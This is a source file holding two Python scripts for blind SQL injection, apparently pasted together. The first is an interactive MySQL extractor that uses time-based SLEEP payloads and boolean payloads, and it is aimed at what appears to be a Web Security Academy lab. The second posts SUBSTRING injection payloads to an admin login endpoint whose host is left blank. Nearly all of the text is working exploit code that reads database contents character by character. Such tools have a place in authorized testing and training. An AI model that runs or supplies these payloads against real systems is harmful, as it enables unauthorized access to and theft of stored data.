#!/usr/bin/python3

#by 21y4d
#Blind SQLi script for MySQL
#To adapt it to other DBMS, change the payloads in getQueryOutput()

import requests, time, urllib3
from termcolor import colored, cprint
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = "https://ac721f1e1f2c5fc2c198f66a0051004e.web-security-academy.net/" #CHANGE HERE
session = requests.Session()

initialTime = time.time()
output = ""

while True: 
    Method = input('SQLi type [T/B]: ') #T: Time-Based Blind SQLi, B: Boolean Blind SQLi
    queryInput = input('SQL query: ')
    if("*" not in queryInput):
        break
    print("Please specify a column name!")

if(Method == 'B'):
    print("Using Boolean Blind SQL Injection")
    defaultLength = int(session.get(url,verify=False).headers['Content-Length'])
else:
    TIME = int(input('Sleep time (s) "High->slow, Low->inaccurate": ') or "3")
    print("Using Time-Based Blind SQL Injection with %s (s) sleep time" % TIME)
    time.sleep(1)

def colorPrintAttempt(Input):
    global output
    print("\033c")
    cprint(output,'green')
    cprint('[*] Trying: ' + Input, 'red')

def colorPrint():
    global output
    print("\033c")
    cprint(output,'green')
    time.sleep(1)

def getQueryOutput(query, rowNumber=0, count=False):
    global TIME
    flag = True
    queryOutput = ""
    tempQueryOutput = ""

    if(count):
        dictionary = "0123456789"
    else:
        dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"

    while flag:
        flag = False
        for j in range(1, 1000):
            for i in range(0, len(dictionary)):
                tempQueryOutput = queryOutput + dictionary[i]
                colorPrintAttempt(tempQueryOutput)
                if(Method == 'T'):
                    if(count):
                        payload = "' AND IF(MID((select count(*) from (%s) as totalCount),%s,1)='%s',SLEEP(%s),0)--+" % (query, str(j), quote(dictionary[i]), str(TIME))
                        print("\nGetting rows count...\n")
                    else:
                        payload = "' AND IF(MID((%s limit %s,1),%s,1)='%s',SLEEP(%s),0)--+" % (query, rowNumber, str(j), quote(dictionary[i]), str(TIME))
                        print("\nScanning row %s/%s...\n"%((rowNumber+1),totalRows))
                    fullurl = url+payload
                    startTime = time.time()
                    r = session.get(fullurl,verify=False)
                    elapsedTime = time.time() - startTime
                    if elapsedTime >= TIME:
                        flag = True
                        break
                elif(Method == 'B'):
                    if(count):
                        payload = "' AND (MID((select count(*) from (%s) as totalCount),%s,1))!='%s'--+" % (query, str(j), quote(dictionary[i]))
                        print("\nGetting rows count...\n")
                    else:
                        payload = "' AND (MID((%s limit %s,1),%s,1))!='%s'--+" % (query, rowNumber, str(j), quote(dictionary[i]))
                        print("\nScanning row %s/%s...\n"%((rowNumber+1),totalRows))
                    fullurl = url+payload
                    r = session.get(url+payload,verify=False)
                    currentLength = int(r.headers['Content-Length'])
                    if(currentLength != defaultLength):
                        flag = True
                        break
                flag = False
            if flag:
                queryOutput = tempQueryOutput
                continue
            break
    return queryOutput

totalRows = int(getQueryOutput(queryInput,0,True))
output = "\nTotal rows: %s\n"%(totalRows)
colorPrint()

for i in range(0, totalRows):
    currentOutput = getQueryOutput(queryInput,i)
    output += '\n[+] Query output: ' + currentOutput
    totalOutput = output +"\n"
    colorPrint()

if(totalRows>1):
    print('\n[+] All rows:\n')
    output = totalOutput
    colorPrint()

totalTime = int(time.time()-initialTime)
print("Total time: " + str(time.strftime('%H:%M:%S', time.gmtime(totalTime))) + " seconds!")




import sys, requests, string, json

query = sys.argv[1]
l= 9
s= ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
    'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 
    's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!','#','$','%','&',
    '(',')','*','+', '-','.','/',':',';','<','=','>','?','@','[',']','^','_','`'
]
url = 'https:///admin'
headers = {
    'Cookie': 'wsg_referrer=; wsg_pages=https:///',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Length': '440',
    'Origin': 'https://',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'close',
    'Referer': 'https:///admin'
}

def poc(query=''):
    global l, s, url, headers
    result = ''
    for i in range(1,l+1):
        for c in s :
            payload= {
            "USN":"admin' and (substring (%s(),%d,1))='%s'-- -"%(query,i,c)
            }
            r= requests.post(url=url,data=payload,headers=headers)
            if '"be":true' in r.text:
                print("Found: %s"%c)
                result += c
    return result
print(poc(query))